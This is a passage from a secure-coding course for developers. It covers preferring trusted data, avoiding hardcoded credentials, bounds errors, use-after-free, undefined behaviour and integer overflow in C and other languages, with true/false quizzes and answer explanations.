This attack seems subtle, but this is a clear violation of our basic rule of thumb: if you have more trusted data available, try to use *that* more trusted data! For example, if you have a password reset request, and you want to send an email to confirm that the originally-confirmed user authorized it, you should send the reset email to exactly the *already confirmed* email address in your database. You have already confirmed that is the correct email address, so you can place more trust in it. This simple rule - *try to use the more trusted data* -  will avoid many subtle attacks without you even realizing it.

However, many applications do have to process untrusted data. In that case, when you have to process untrusted data, treat it as ***radioactive*** - that is, be careful when you process it in any way, remembering that it might be from an attacker. There are many ways you need to be careful, as we will discuss.

#### Quiz 2.1: Prefer Trusted Data. Treat Untrusted Data as Dangerous

\>>If we receive a password reset request for an email account, and it has a case-insensitive match to a verified email account in our database, we should send the confirmation to the email account the user just sent. True or False?<<

( ) True

(x) False

\[Explanation]

Absolutely not. A potential attacker has sent an email address, and so the only thing you can be sure of is that someone sent that email address. If the reset is for a particular account, only an email to an address *known* to apply to that account (from the database) should be used, because in general we prefer to use (more) trusted data.

Password resets using just email are not a strong authentication mechanism to start with. But it is a common enough circumstance, and it is useful as a simple example.

\[Explanation]

### Avoid Default & Hardcoded Credentials

Many programs have to use some secret information. An especially common kind of secret is a *credential* (e.g., a password or secret key).  How you protect them depends on how they are used, and there are two common uses for credentials:

*   **Inbound**<br>The software receives some credentials as input and checks if it matches to authenticate something else.

*   **Outbound**<br>The software sends the credentials to something else to authenticate itself to something else.

#### Avoid Default Credentials

Software should never be delivered with default credentials. There are endless web pages that track default credentials like **admin/admin**. Once anyone finds the credentials, they are likely to eventually end up on these listings. This will enable attackers to break into your software (if it is an inbound credential) or others’ software (if it is an outbound credential). If the software has many installations, then they may all be vulnerable at the same time. **Remember:** Users generally accept whatever is the default, and if the default is insecure, then the software will be insecure. Obfuscating the code is not enough; many attackers are quite adept at extracting and analyzing executables.

The usual solution for this is to have a “first login” mode that detects that there is no credential (password or key) yet, and then lets the user create a unique one. That is assuming it needs to be stored at all; in some cases, you can simply ask the user to provide it each time.

#### Avoid Hardcoded Credentials, Store Them Safely Instead

Hardcoded credentials are credentials stored within the source code, compiled code, or any other location that cannot be quickly changed by someone authorized to do so.

Hardcoded credentials are mistakes. Credentials should be changed whenever the software is first installed for use and should be easy and quick to change. Storing credentials in source code is a particularly bad idea. Source code is typically managed by version control systems, so any credentials in the code will become available to anyone with access to that source code … and that is often far more people than need to know. Encoding this information in a way that can be undone (e.g., using Base64 or ROT13) doesn’t help.

So: don’t hardcode credentials (e.g., within source code or compiled code). Instead, store credentials separately in a way that makes them easy to change. Public key certificates usually don’t need to be kept secret, but they may need to be updated. Other credentials often need to be kept secret, and should be protected at least as much as necessary. As we will briefly discuss later, there are tools that may help you identify hardcoded credentials in source code.

For inbound authentication using passwords, store credentials separately and use a secure algorithm specifically designed for encoding them. We will discuss this in more detail later in the section on Cryptography, but for now, just know that you need to use an *iterated per-user salted cryptographic hash* algorithm such as Argon2id.

For outbound authentication, credentials should be stored outside the code in a storage system that is protected from all outsiders (including local users on the same system/cloud host). Ideally, all credentials would be stored in an encrypted file or database, but in many environments, this is difficult to do (where do you store the key to access the key?). At the very least, store credentials in something like a file or database table with permissions that are as restrictive as you can practically make them. Environment variables are generally a weaker way to store credentials, since their values are available to the entire process that loads them, but in some circumstances this is acceptable… and it is generally much better than hardcoding credentials.

🔔 Hardcoded credentials are such a common cause of security vulnerabilities that they are 2021 CWE Top 25 #16 and 2019 CWE Top 25 #19. This weakness is [CWE-798](https://cwe.mitre.org/data/definitions/798.html), *Use of Hard-coded Credentials*. The related *Insufficiently Protected Credentials* is 2021 CWE Top 25 #21 and 2019 CWE Top 25 #27 as [CWE-522](https://cwe.mitre.org/data/definitions/522.html).

#### Quiz 2.2: Avoid Default & Hardcoded Credentials

\>>Secret keys should be stored in source code so that they cannot be easily read, as they could be if they were stored in separate files. True or False?<<

( ) True

(x) False

\[Explanation]

No, quite the opposite. Don’t store secret keys in source code! Source code is often shared with many others, and is stored in version control systems (making it more accessible to others). Another reason to store secret keys separately is so they can be easily changed. If an attacker reads the secret keys, then just change the keys.

\[Explanation]

### Avoid Incorrect Conversion or Cast

Almost all programming languages support multiple data types, such as integers, floating point, characters, and strings. Most programming languages have at least some type checking built into them; types can be checked statically (before run-time) and/or dynamically (at run-time). These checks can sometimes warn, or counter, serious problems.

Sometimes it is necessary to convert or cast a data value from one type to another. The details depend on the programming language, but while it is necessary, incorrect conversions and casts end up causing a disproportionate number of vulnerabilities. The conversion can lose information, or lead to a new value that might have been completely unexpected. Any conversion or casting, especially one that might lose information, should be reviewed to consider if there is a risk to doing it. Some languages have a **const** qualifier for declaring constants; it is dangerous to cast away a **const** qualifier, because this allows changes to the value while other parts of the system may depend on it being constant.

A special case, which can happen in some programming languages, is called “type confusion”. Type confusion occurs when the access to a resource occurs using a type that’s incompatible with its original type. This could be considered a silent incorrect conversion. This is easily done in languages like C and C++ using union types, where the same memory region can be expressly defined as allowing multiple types. When using union types, the developer must ensure that only the correct type is used for a given access (read or write).

Type confusion isn’t limited to C and C++, however. Type confusion can happen in any language where the same variable or memory location can be interpreted in more than one way. As noted by MITRE for [CWE-843](https://cwe.mitre.org/data/definitions/843.html), “errors in PHP applications can be triggered by providing array parameters when scalars are expected, or vice versa. Languages such as Perl, which perform automatic conversion of a variable of one type when it is accessed as if it were another type, can also contain these issues.”

For our purposes, conversions do not include determining if a value is truthy. In general, programming languages have conditional constructs (such as **if** and **while**) that will produce different results depending on whether or not a condition’s value is truthy. What is truthy is a key design decision when creating a programming language. For example, every value in JavaScript is considered truthy except for a specific list of falsy values (currently **false**, **0**, **-0**, **0n**, **“”**, **null**, **undefined**, and **NaN**). In such languages, **if p** and similar are a shorthand for checking if a value is truthy. This interpretation in conditionals might be considered a conversion from some other type into a boolean type, but such constructs are really just an abbreviated way to determine if a value is truthy, and that is not what we are concerned with here.

🔔 *Incorrect Type Conversion or Cast* ([CWE-704](https://cwe.mitre.org/data/definitions/704.html)) is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #28. 2021 CWE Top 25 #36 refers to its special case, *Access of Resource Using Incompatible Type ('Type Confusion')* ([CWE-843](https://cwe.mitre.org/data/definitions/843.html)).

#### Quiz 2.3: Avoid Incorrect Conversion or Cast

\>>Which of the following might be concerning about a cast? Select all answers that apply.<<

\[!x] The cast might lose important information.

\[x] The cast might produce a new value that was unexpected in that context.

\[x] The cast might remove whether or not the value is considered constant, causing potential problems for other code that might depend on it being constant.

\[ ] The cast might change the type.

\[Explanation]

A cast changes a value’s type (that is what it is *for*), so by itself that is not concerning. What is concerning are the potential impacts of such changes in context.

\[Explanation]

## Processing Data Securely: Undefined Behavior / Memory Safety

### Countering Out-of-Bounds Reads and Writes (Buffer Overflow)

\[Memory-unsafe code]

#### Memory Safety

Unfortunately, handling untrusted data can be *especially* hard in some programming languages or when certain programming language modes are enabled. Most programming languages automatically prevent any attempt to read or write memory areas that are not allocated. These are called *memory safe languages*. However, memory safety mechanisms generally have a performance overhead.

As a result, some programming languages that emphasize performance are either *not* memory safe or have a way to disable memory safety. The widely-used programming languages C and C++ are *not* memory safe. There are also some languages emphasize performance that are *normally* memory safe, but have a way to disable safety checks to enable adequate performance; these include Rust (when using unsafe code), C# (when using unsafe code), and Ada (when using pragma suppress to suppress memory safety checks).

Memory safety problems are a common cause of vulnerabilities. Catalin Cimpanu’s study, [*Microsoft: 70 percent of all security bugs are memory safe issues*](https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/) (2019), found that about ~70% of all Microsoft vulnerabilities in 2006-2018 were due to memory safety issues. What is more, while there are annual fluctuations, it has been relatively stable over that time:

![Memory safety has been consistently a vulnerability over time](memory_safety_over_time.png)

**Percentage of memory-safety vulnerabilities at Microsoft** (by Catalin Cimpanu, 2019, retrieved from [ZDNet](https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/))

Memory safety is a subset of a larger category called *undefined behavior*, where the system guarantees nothing - and undefined behavior often leads to security vulnerabilities. We will discuss this more later, but we will briefly note that C and C++ have a remarkably large number of undefined behaviors, making it especially difficult to write secure software in these languages.

You can have these problems *even if* you write code in a language that is memory-safe and has no undefined behaviors. Your code might call some *other* code with undefined behavior that leads to vulnerabilities. Since almost every program ends up calling out to at least some code written with C or C++, that means at least some parts of your program might be indirectly vulnerable, even if your program is not written in C or C++.

One of the best-known attacker tricks is out-of-bounds reads and writes (including *buffer overflows*) - so we will briefly talk about what that is and how to counter it. We will then discuss another kind of flaw that often leads to security vulnerabilities, double-frees. Finally, we will discuss the larger category of undefined behaviors.

#### Out-of-Bounds Reads/Writes and Buffer Overflow

One of the most common kinds of security vulnerabilities is where a read or write is *“out of bounds”* inside memory-unsafe code. Such vulnerabilities are common, and attackers find them easy to exploit. This problem has been well-known for a long time; Aleph One (Elias Levy) describes in detail in [*Smashing the Stack for Fun and Profit*](http://phrack.org/issues/49/14.html#article) (1996) how to exploit such vulnerabilities.

🔔 Out-of-bounds reads and writes are so common and dangerous that in the 2021 CWE Top 25 list, the #1 weakness involves writes ([CWE-787](https://cwe.mitre.org/data/definitions/787.html) *Out-of-bounds Write*), the #3 weakness involves reads ([CWE-125](https://cwe.mitre.org/data/definitions/125.html) *Out-of-bounds Read*), and the general issue is #17 ([CWE-119](https://cwe.mitre.org/data/definitions/119.html) *Improper Restriction of Operations within the Bounds of a Memory Buffer*). In the 2019 CWE Top 25 list the general issue is #1 ([CWE-119](https://cwe.mitre.org/data/definitions/119.html) *Improper Restriction of Operations within the Bounds of a Memory Buffer*), and specific cases of it are #5 ([CWE-125](https://cwe.mitre.org/data/definitions/125.html) *Out-of-bounds Read*) and #12 ([CWE-787](https://cwe.mitre.org/data/definitions/787.html) *Out-of-bounds Write*).

Here are the fundamentals. Almost all programs have to store intermediate results, and such storage areas are often called *buffers*. Reading and writing within that buffer is fine. But what happens when your program tries to read from or write to that buffer, but it tries to do that outside the range of that storage area? For example, here is a trivial fragment of a C program that allocates some array **x** of size 10 (index values 0 through 9), and later stores the value of **y** to the index value **i** of that array:

```C
    char x[10];
    ...
    x[i] = y;
```

What happens if the value of **i** is out of bounds (that is, has a value other than 0 through 9)? There are two safe and common options that happen in different programming languages:

1.  **Resize**<br>In many programming languages, trying to write (or read) out of bounds will resize the array so that the value can be stored or read from.

2.  **Error**<br>In some languages, particularly those focused on excellent performance, an error (usually an exception) will be reported if the index is out of bounds.

Unfortunately, there is a third option: an out-of-bounds read or write can be accepted and turned into a potential security vulnerability. If you use a memory-unsafe language such as C, C++, or assembly language, then any read or write that can go out-of-bounds is a potentially dangerous security vulnerability. This problem can also happen if the language is normally memory-safe, but you disable the language’s memory safety checks (such as Rust, C#, and Ada).

In C, any attempt to read or write outside the bounds of a buffer (via an array index or a pointer) is an example of *undefined behavior*. If a C program will eventually execute a statement that will cause undefined behavior, the code is allowed to do anything at all at any time - even before that statement that caused the undefined behavior! You can find more information in the following references:

*   [*With Undefined Behavior, Anything is Possible*](https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html) (2018), by Raph Levien

*   [*Undefined behavior can result in time travel (among other things, but time travel is the funkiest)*](https://devblogs.microsoft.com/oldnewthing/20140627-00/?p=633) (2014), by Raymond Chen

*   [*A Guide to Undefined Behavior in C and C++ (Parts 1-3)*](http://blog.regehr.org/archives/213) (2010), by John Regehr.

In *practice*, if there is no memory safety, a write outside a buffer in most programming language implementations often ends up corrupting internal data structures that the program depends on. For example, it may overwrite local variables and/or change what will be run after a function returns. Similarly, a read outside a buffer often reveals internal information that is not normally revealed, including secrets that security (such as keys or hardening systems) depend on. In addition, if it is C or C++, compilers will often use such statements as a license to generate some very surprising machine code (because compiler authors are allowed to presume that such things will not happen). Attackers have honed their craft over decades to exploit these vulnerabilities, because they are common and they can often quickly turn discovery of this kind of vulnerability into a devastating attack.

There are many names for these attacks, with varying terminology and meanings. One of the most common variations of this vulnerability is when the attacker can write past the end of an array, and this vulnerability is sometimes called a *classic buffer overflow* vulnerability. An attack that exploits this vulnerability by writing data outside a buffer is often called a *stack smashing attack* (if the buffer is on the stack, such as by being a local parameter) or a *heap smashing attack* (if the buffer is on the heap, that is, was previously allocated by **new** or **malloc** depending on the language). CWE has various identifiers and names, including [CWE-119](https://cwe.mitre.org/data/definitions/119.html) (*Improper Restriction of Operations within the Bounds of a Memory Buffer*), which is a special case of [CWE-118](https://cwe.mitre.org/data/definitions/118.html) (*Incorrect Access of Indexable Resource (‘Range Error’)*).

If an attacker can cause your program to write outside its buffer, this often results in a serious vulnerability where the attacker can cause the program to do anything at all.

Unbounded writes are not the only problem. Historically, people worried about out-of-bounds writes more than reads, but the Heartbleed vulnerability in 2014 showed that out-of-bounds reads could also be extremely dangerous. Out-of-bounds reads can reveal information that allow attackers to completely break into a system. Even programs that only allow one byte of an out-of-bound read or write can have a dangerous vulnerability.

![image alt text](heartbleed.png)

**Heartbleed Explained**. Retrieved from [xkcd](https://xkcd.com/1354/), licensed under [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

> 😱 STORY TIME: Heartbleed

> In 2014 a vulnerability named Heartbleed ([CVE-2014-0160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-0160)) was found in the widely-used OpenSSL cryptographic library.  The key weakness was a buffer over-read (past the end of the buffer) was allowed in the heap due to improper input validation. This vulnerability allowed attackers to acquire sensitive data, and OpenSSL managed some extremely sensitive data such as server private keys. This vulnerability affected a huge number of popular websites, leading to problems such as user account hijacking and information compromises of millions of patients. ([*How to Prevent the next Heartbleed*](https://dwheeler.com/essays/heartbleed.html), 2020, by David A. Wheeler)

#### Solutions for Out-of-Bounds Reads and Writes

If you are curious, there are many papers and college courses that go into depth on exactly why this problem is so dangerous. But if you are just developing software, those details do not matter - you simply need to make sure that reads and writes are always within the bounds of what they are supposed to refer to. So how can we do this?

The simplest solution: ***always, where practical, use memory-safe languages and keep memory safety on***. Almost all programming languages are memory-safe, at least by default. If you try to access a buffer outside of its bounds in a memory-safe language, it will resize the buffer or give you an error (typically an exception). In either case, the system doesn’t just cede control to an attacker. This solution is easier to apply when you are writing code from scratch, of course.

But sometimes this is not practical. This means you could never use C, C++, or assembly language. It would also mean you could not ever disable memory-safety in other languages. There are many large programs in C or C++ that would be difficult to rewrite, and of course, there are reasons people choose those languages. Most operating system kernels are written in C, since they are performance-critical and C was specifically designed for this task. Similarly, in languages that let you disable memory safety, there are reasons those mechanisms exist.

If you *must* have code without memory-safety, try to limit what is memory-unsafe where that is practical. For example, in languages that are memory-safe by default, but have mechanisms to disable it, you should minimize the amount of code that runs without memory safety. A large library in Rust, C#, or Ada should be almost entirely safe, with at most a very small unsafe portion. If you have a lot of existing C or C++ code, consider rewriting a portion in a memory-safe language. If you rewrite a portion, you should typically focus on the *most dangerous* portion (that is, code that is most exposed to attackers). For example, Mozilla’s Firefox browser was written mostly in C++ (and some JavaScript), but in 2017 some of that C++ code was replaced by implementations in Rust, and increasingly more and more of Firefox is written in Rust (Mozilla [*Oxidation*](https://wiki.mozilla.org/Oxidation) and [*Rust vs. C++ in macOS Firefox Nightly*](https://docs.google.com/spreadsheets/d/1flUGg6Ut4bjtyWdyH\_9emD9EAN01ljTAVft2S4Dq620/edit#gid=885787479)).

If you have to program without memory safety checks, for whatever reason, then you have to carefully implement all the checks in the code itself. For security, you must make sure you never ever make a mistake: you must ensure that every reference is in bounds no matter what the attacker does. Each check is not hard to do; this is not rocket science. The problem is that never ever making a mistake is difficult to do. You can be very smart and still make a mistake. If you do write software without memory safety checks, where possible, you should use mechanisms like tools and peer review to reduce the risks of something slipping through to users. Later on we will discuss some of the tooling available to help.

Of course, just doing a check is not enough - what do you do when the check fails? The safest thing to do is to reject the input and not perform any action if a check fails along the way. However, it is often hard to do the rejection, and so developers are tempted to simply trim off any extra (or write code that accidentally does this). Sometimes that is fine, but this often means that an attacker can control what stays in the buffer and what doesn’t. That can sometimes lead to vulnerabilities, and determining if there is a vulnerability can be really difficult.

If you use C, there are many patterns that are especially likely to be vulnerable, including the use of functions like **strcpy()** to copy a string, **strcat()** to concatenate a string, and loops that incrementally add to a buffer. Early in C’s development, functions were created that limited where data would be written, specifically **strncpy()** and **strncat()**. However, using **strncpy()** and **strncat()** requires constant recalculation of the *space left over*, making them difficult to use correctly (it is extremely easy to have an “off by one” error in this code that only attackers notice). The **strncpy()** function also overwrites all remaining space, making it absurdly inefficient for most circumstances.

If you use C, sometimes you can use safer functions instead. The C function **snprintf()** writes output to a string buffer given a format, and it will not overwrite past a given length. The function **memccpy()** lets you do a simple copy, again without going beyond a maximum length. However, in all these cases you cannot just call the function - in most cases, you also have to check its return value to see if there was an overrun, and if there was, do something sensible (which is usually to stop processing the input). The functions **asprintf()** and **vasprintf()** let you reallocate a new string, which you can use to resize a string. As always, you must ensure that you free any previously-allocated strings once they are no longer used, and ensure that you only free them once (a problem we will discuss more soon). If you are not prepared to do this very carefully and methodically, you probably should not be using C.

Modern compilers for these languages, and the operating systems that support them, use a variety of hardening techniques to make exploiting these attacks harder. Widely-applied hardening measures include:

*   Address Space Layout Randomization (ASLR)<br>Randomize where objects are stored in memory, making it harder for attackers to target some objects (in the gcc and clang compilers you may need to enable PIE mode, e.g., using **-fPIE**)

*   Non-executable memory<br>Ensure that memory with executable instructions cannot also be written to at the same time, making it slightly harder for attackers to modify software or introduce their own malicious code.

*   Canaries<br>Insert an extra check in selected functions; before they return, they do a sanity check on a value called a “guard” or “canary” that detects certain kinds of buffer overflows that perform writes (the gcc and clang compilers can do this with options like **-fstack-protector**)

*   Automated bounds insertions<br>Modify code during compilation to do bounds checking even if was not originally requested (the gcc and clang compilers can do this with the option **-D_FORTIFY_SOURCE=2**).

If you are writing code that is not memory-safe, or calling code that is not memory-safe, make sure hardening measures like these are enabled whenever you can, including in compilation, test, and production. The good news is that hardening measures like these will slow down some exploits. But in the end, hardening measures often do not *prevent* exploits. In the best case, these hardening measures turn “take over program” into “program stops working”... and that is the *best* case. The only way to not have vulnerable code… is to not have vulnerable code.

#### Quiz 2.4: Countering Out-of-Bounds Reads and Writes (Buffer Overflow)

\>>Programs written in memory-unsafe languages, such as C and C++, must be careful to *never* allow an untrusted user to cause an out-of-bounds read or write. This can be challenging to do without fail; correct application of functions like **snprintf()** can help. True or False?<<

(x) True

( ) False

\[Explanation]

Correct. Of course, it is safer to not use memory-unsafe languages in the first place, but that is not always an option today.

\[Explanation]

### Double-free, Use-after-free, and Missing Release

\[Memory-unsafe code]

Out-of-bounds reads and writes are not the only problem for programs written in languages like C or C++.

When processing information you typically need to allocate memory (e.g., with **new**) and use it for a while. Most programming languages automatically track when you don’t need to use memory any more and reclaim it; this process is called *automatic garbage collection* or *automated memory management* (we will use the latter term). There are different ways to do automated memory management (the most typical are reference counting or tracing), and terminology varies, but the point is that in most programming languages this is automatically handled for you.

But in some programming languages you must *manually* release memory when you are done with it. In particular, this is true for C (**free**) and C++ (**delete**). If you forget to release the memory when you are done using it, this leads to a “memory leak"; the program will increasingly use more and more memory. In some situations this increasing memory use can lead to increasingly poor performance or a crash, which is a loss of availability.

Often the more important security issue is manually freeing the memory region *more* than once; this is called a *double free*. Another big security problem is *use-after-free*, that is, using the memory after it has been freed. In memory-safe languages a double-free or use-after-free won’t happen. However, a double-free or use-after-free in a C or C++ program often corrupts low-level infrastructure and can change the value of program values that *appear* to be unrelated.

If an attacker can cause your program to double-free or use-after-free, this can result in a serious vulnerability where the attacker can cause the program to do anything. That is because these mistakes often allow an attacker to corrupt and control the infrastructure your program runs on.

The obvious solution is to only use programming languages where you don’t have to manually release memory. Most programming languages handle memory management automatically.

In cases where that is not practical, simplify your code as best you can so that it is clear where deallocation will occur, so that it will occur exactly once and you never use it again. Consider setting pointers to NULL (0) when you are done with what they point to. This will reduce the risk of freeing them or using them again later, and if unnecessary many of those assignments will be optimized away by the compiler.

🔔 Use-after-free is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #7 and 2019 CWE Top 25 #7. It is [CWE-416](https://cwe.mitre.org/data/definitions/416.html) (*Use After Free*). Double-free is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #31. It is [CWE-415](https://cwe.mitre.org/data/definitions/415.html) (*Double Free*).  Failing to release memory once it is no longer needed is 2021 CWE Top 25 #32; it is [CWE-401](https://cwe.mitre.org/data/definitions/401.html) (Missing Release of Memory after Effective Lifetime).

#### Quiz 2.5: Double-free, Use-after-free, and Missing Release

\>>In C and C++ it doesn’t matter if you use a memory region after freeing it, as long as you use the memory region within the same function or method. True or False?<<

( ) True

(x) False

\[Explanation]

No, it is not safe to use a memory region after freeing it, no matter what. It *might* work out a specific time, and not another.

\[Explanation]

### Avoid Undefined Behavior

\[Memory-unsafe code]

Many programming languages are defined in some sort of formal specification. When that is the case, where practical, you should try to write code that conforms to those specifications, because your code is more likely to work in all cases, and as the language implementations change, your code is more likely to keep working.

Sometimes these specifications will permit one of several different options (this is sometimes called “unspecified behavior” or “compiler-specific behavior”). You should normally try to write your code so that it does not matter which permitted option is used, it will just keep working. Languages that support threading allow the threads to execute in parallel and in arbitrary order. In many languages, the order of operations in a call such as **f(aa, bb, cc)** is not defined (that is, it does not guarantee that **aa** or **cc** is computed first). Beware of depending on what your tools currently do, because when the tools are upgraded what they do may change. For many developers, dealing with this is already second nature.

However, some languages (such as C and C++) have constructs with truly *undefined behavior*. That is, if you take certain actions, the specification guarantees *absolutely nothing*. For example, the [C FAQ](http://c-faq.com/ansi/undef.html) notes that with undefined behavior, *“Anything at all can happen; the Standard imposes no requirements. The program may fail to compile, or it may execute incorrectly (either crashing or silently generating incorrect results), or it may fortuitously do exactly what the programmer intended.”*

Any undefined behavior can be - and often is - a security vulnerability. Even if it just happens to not be a security vulnerability today, a minor upgrade in your tools, operating system, or configuration might turn it into a vulnerability.

Many languages have at least some undefined behaviors, and so, if you use those languages, you need to learn what they are and avoid them. C and C++ have an especially large number of undefined behaviors. For example, for C, there are hundreds of undefined behaviors; the list is 11 pages long in the publicly available final draft of [C18 annex J.2](https://web.archive.org/web/20181230041359if\_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17\_updated_proposed_fdis.pdf). It is also very easy in C and C++ to accidentally write code that has undefined behavior.  We have already seen some examples of undefined behavior: reads and writes out of the bounds of a buffer, use-after-free, and double-frees. Here are a few more.

In C and C++, a null pointer dereference is also undefined (e.g., evaluating “**\*p**” when **p** is **NULL**). This means that an attempt to dereference a null pointer does not necessarily lead to trying to read an invalid value, the program might do *anything* at all.

🔔 *Null Pointer Dereference* ([CWE-476](https://cwe.mitre.org/data/definitions/476.html)) is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #15 and 2019 CWE Top 25 #14.

In C  and C++, signed integer overflow is undefined (e.g., an **int** with value **MAX_INT** with 1 added to it). There is no guarantee that signed integers wrap; instead, the program might do anything at all.

🔔  Integer overflow or wraparound is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #12 and 2019 CWE Top 25 #8. It is [CWE-190](https://cwe.mitre.org/data/definitions/190.html), *Integer overflow or wraparound* (though this CWE also covers unsigned wraparound, which is defined in C and C++).

Perhaps by now it is clear why many people recommend avoiding C and C++ if the code has to be secure. For a variety of reasons, it is more difficult to write secure software in these languages! But again, there are *reasons* that people choose these languages, and of course, if something is already written in these languages, it is hard to change.

So, if you do use C and C++, there are ways you can reduce your risks. We have already discussed some options. Here are a few more:

*   Read its standards carefully so that you know all common undefined behaviors and actively avoid them when writing code.

*   Turn on warnings about undefined behaviors. Examples of such gcc and/or clang flags include **-fsanitize=signed-overflow** (warn about signed overflow), **-ftrapv** (traps signed integer overflows), **-fsanitize=address**, **-fsanitize=undefined**, and **-fcatch-undefined-behavior** (but it will not ALWAYS detect them!)

*   Force the compiler to assign a meaning to officially undefined behaviors. You should not rely on these, but they will reduce the impact of making a mistake. Examples of such gcc and/or clang flags include **-fwrapv** (wrap integers on overflow), **-fno-delete-null-pointer-checks**, and **-fno-strict-overflow**.

We will later discuss using tools to try to detect these, but be warned: most tools at best detect *some* undefined behaviors, not all of them. Your best defense is to use a language with no or few undefined behaviors. Where that is not reasonable, know exactly what is not defined, and carefully write code so it does not depend on undefined behaviors.

#### Quiz 2.6: Avoid Undefined Behavior

\>>In C and C++, a null pointer dereference is not a serious security problem, because you will just read a data value or, at worst, crash the program. True or False?<<

( ) True

(x) False

\[Explanation]

No, in C and C++ a null pointer dereference is undefined behavior. Any undefined behavior could cause anything bad to happen, including erasing all files, displaying all secret keys, or anything else. It is more likely to cause a subtle problem, but that subtle problem could also be a serious security vulnerability.

\[Explanation]

## Processing Data Securely: Calculate Correctly

### Avoid Integer Overflow, Wraparound, and Underflow

It’s common to calculate integers in programs, such as by continuously incrementing (adding 1 to) a variable. However, no computer can truly handle an infinite number of digits. In fact, many programming languages use a fixed number of bits in their most common integer types, so the minimum and maximum integers have a much smaller range than what could be represented by the computer.

If an attacker can cause an integer calculation to exceed the range of the integer’s representation, the result can be a vulnerability. Since integer calculations are common, and developers often forget that computers can’t actually handle an infinite number of digits, this is a relatively common vulnerability.

As we’ve already noted, in C and C++, you must write your program so that an attacker cannot cause the usual signed integer types (such as int) to overflow or underflow. A signed integer overflow or underflow is normally undefined behavior in C and C++, and the program is allowed to do anything at all when it occurs (including triggering a vulnerability).

In C and C++, overflowing or underflowing an unsigned integer wraps around in its underlying representation (typically two’s complement). So in C and C++ it’s typical that adding 1 to the largest representable unsigned value will produce 0. In many other programming languages, both signed and unsigned integers are stored in a fixed length and wrap around on overflow & underflow (typically in two’s complement). This is not always a good thing; if an attacker can cause an underflow or overflow, and if the program was not designed to handle it, the result can often be a vulnerability.

Some programming languages automatically switch to “big number” integer formats as needed to support an arbitrary number of digits, instead of using a fixed number of bits to represent an integer. These programming languages include Python, Ruby, and Scheme. Many other programming languages provide support for such formats, such as through a library, though you may need to specifically request using this format (e.g., as a type). These formats can’t really support an infinite number of digits, since no computer has infinite memory, but this does greatly reduce the risk of such problems. In many cases an exception is raised if the calculation runs out of space, so make sure the program can properly handle that exception. A common problem is that programs often need to call a routine written in a different programming language, and during that conversion the number may be converted to a fixed-width format that cannot store the value (thus recreating the problem).

The JavaScript programming language is an unusual case. The JavaScript specification, called ECMAScript, does not provide direct support for integers. Instead, integers are typically represented using floating point numbers. As noted in the ECMAScript language specification (section "The Number Type"), this means that JavaScript’s Number type can accurately represent all positive and negative mathematical integers whose magnitude is no greater than 2<sup>53</sup>. However, if an attacker can cause calculated integers to go beyond this range, odd things can happen. For example, incrementing a positive integer beyond this value is likely to produce an unchanged result, since the underlying type cannot store every digit. There are also some operators that only deal with integers in specific ranges (such as -2<sup>31</sup> through 2<sup>31</sup>-1 inclusive, or 0 through 2<sup>16</sup>-1 inclusive); make sure an attacker can’t cause those ranges to be exceeded before you call those operators. For more information see the [ECMAScript ® 2021 Language Specification](https://www.ecma-international.org/publications-and-standards/standards/ecma-262/) from ECMA.

One of the simplest ways to ensure an attacker cannot trigger vulnerabilities from integer overflows and underflows is to do input validation on all untrusted numbers. In all those input validation checks, enforce minimum and maximum values on all untrusted integers so that the accepted inputs cannot lead to a calculation that would trigger an integer overflow or underflow. If this is done, then there can’t be any such vulnerabilities. If this can’t be done, then the program needs to detect integer overflows and underflows that can be triggered by an attacker, either before or after the calculation, and handle them appropriately.

> 😱 STORY TIME: NetUSB CVE-2021-45608

> An example of an integer overflow leading to a vulnerability is [CVE-2021-45608](https://nvd.nist.gov/vuln/detail/CVE-2021-45608), as explained in “[CVE-2021-45608 | NetUSB RCE Flaw in Millions of End User Routers](https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/)” by Sentinel Labs.  The KCodes NetUSB kernel module, used by a large number of network device vendors, had an integer overflow vulnerability. The module took an untrusted client-provided length, added 0x11, and allocated that amount of memory. If the requested length was large (e.g., all 1s in binary), the addition would wrap around, causing a too-small allocation. After that, data would be dumped into the too-small buffer, leading to a buffer overflow.
>
> This shows that it’s important to check for wraparound when using attacker-controlled data, especially if you use it to make size or out-of-range decisions. Other rules can be learned as well. First, always validate data from an untrusted source (e.g., data from the Internet) - there was no reason to allow any allocation request this big. Second, this module listened to requests from the wide-area network (WAN) instead of just the local area network (LAN); software should minimize privilege to only what's needed to reduce the likelihood or impact of damage if there is a vulnerability.

🔔  Integer overflow or wraparound is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #12 and 2019 CWE Top 25 #8. It is [CWE-190](https://cwe.mitre.org/data/definitions/190.html), *Integer overflow or wraparound*.

#### Quiz 2.7: Avoid Integer Overflow, Wraparound, and Underflow

> > Integer overflows can be ignored when handling untrusted data. True or False?<<

( ) True
(x) False

\[Explanation]
No. The range of possible values varies by language and types used, but attackers can sometimes exploit integer overflows.
\[Explanation]

# Calling Other Programs

This chapter describes how to call other programs securely, including how to counter injection attacks (including SQL injection and OS command injection) and how to properly handle filenames/pathnames.

Learning objectives:

1.  Discuss the basics of securely calling other programs.

2.  Understand how to counter injection attacks (including SQL injection and OS command injection).

3.  Discuss proper handling of filenames/pathnames.

## Introduction to Securely Calling Programs

### Introduction to Securely Calling Programs - The Basics

Very few programs are entirely self-contained; nearly all programs call out to other programs. This includes local programs, such as programs provided by the operating system, built-in software libraries for that language, and software from package repositories (like npm, PyPI, and maven). Modern systems often call out through a network to other services, making requests through various APIs (such as REST and GraphQL APIs) and receiving data in formats such as JSON and XML. Almost all of these programs then call other programs. Often, these indirect calls are not obvious (e.g., calling a library written by someone else) or involve a great deal of “hidden” infrastructure.

You need to be careful about what programs you choose to use (trust) and manage them (e.g., how you record and update them). Once you choose them, you must be careful about how you use these other programs. In this section, we are going to talk about securely *using* other programs.

